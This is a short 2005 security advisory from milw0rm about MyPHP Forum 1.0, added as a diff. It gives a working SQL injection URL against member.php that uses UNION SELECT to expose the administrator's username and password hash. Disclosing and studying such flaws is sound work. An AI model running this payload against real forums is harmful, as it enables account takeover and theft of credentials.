@@ -1,0 +1,14 @@
+/*==========================================*/
+// GHC -> MyPHP Forum <- ADVISORY
+// Product: MyPHP Forum
+// Version: 1.0
+// URL: http://www.myphp.ws
+// VULNERABILITY CLASS: SQL injection
+/*==========================================*/
+
+[example of exploit]
+member.php?action=viewpro&member=nonexist' UNION SELECT uid, username, password, status, email, website, aim, msn, location, sig, regdate, posts, password as yahoo FROM nb_member WHERE uid='1
+
+/* will show administrator's name and password hash (in the "Yahoo" field). */
+
+# milw0rm.com [2005-02-10]
